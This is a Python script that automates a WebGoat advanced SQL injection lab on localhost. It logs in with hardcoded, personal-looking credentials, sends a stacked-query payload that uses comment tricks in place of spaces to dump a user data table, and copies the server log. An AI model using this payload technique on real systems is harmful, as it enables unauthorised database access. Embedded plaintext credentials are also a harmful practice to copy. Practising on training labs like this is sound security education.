import requests
import time

# Define the base URL
BASE_URL = 'http://127.0.0.1:8080/WebGoat/'
LOGIN_URL = f'{BASE_URL}login'
ATTACK_URL = f'{BASE_URL}SqlInjectionAdvanced/attack6a'
LOG_FILE_PATH = '/home/ubuntu/Desktop/testfolder/VulApp/logs/webgoat.log'  # Path to WebGoat SQL log file

# Create a session to persist cookies across requests
session = requests.Session()

# Retrieve the login page content
response = session.get(LOGIN_URL)

# Define login credentials
login_data = {
    'username': 'sbombatkar',
    'password': 'Sneha#1234'
}

# Submit the login details to authenticate
response = session.post(LOGIN_URL, data=login_data, allow_redirects=True)

# Check if the login is successful
if 'Invalid username and password' not in response.text:
    print("Login Successful!")
else:
    print("Failed to Login.")
    session.close()
    sys.exit()

# Access the lesson page to set up the attack
session.get(f'{BASE_URL}SqlInjectionAdvanced.lesson.lesson')

# Define the SQL injection payload for the attack
payload = "cyber';/**/select/**/*/**/from/**/user_system_data;--"

# Data to be sent in the POST request
attack_data = {
    'userid_6a': payload
}

# Perform the SQL injection attack
response = session.post(ATTACK_URL, data=attack_data)

# Check if the SQL injection is successful based on the response content
if response.status_code == 200:
    response_data = response.json()
    if "lessonCompleted" in response_data and response_data["lessonCompleted"]:
        feedback = response_data["feedback"]
        output = response_data["output"]
       
        # Clean up the feedback to match the desired format
        feedback = feedback.replace('<p>', '').replace('<br \\/>', '\n').replace('<\\/p>', '').strip()

        # Print the formatted result
        print(f"{feedback}\n\n{output}")
        print('SQL Injection Success!')
    else:
        print("SQL Injection Failed. The lesson is not completed.")
else:
    print("SQL Injection Failed. Check the payload or the target URL.")
    if response.status_code == 500:
        print("Internal Server Error encountered. Check the WebGoat logs for more details.")

# Fetch and store the SQL logs
def fetch_and_store_logs():
    try:
        with open(LOG_FILE_PATH, 'r') as log_file:
            logs = log_file.read()
            with open('sql_injection_logs.log', 'w') as output_file:
                output_file.write(logs)
            print("SQL Injection logs stored in 'sql_injection_logs.log'")
    except Exception as e:
        print(f"Failed to read or write logs: {e}")

# Wait for logs to be written (optional, depends on your logging setup)
time.sleep(5)  # Adjust sleep time as necessary

# Fetch and store the logs
fetch_and_store_logs()

# Close the session
session.close()
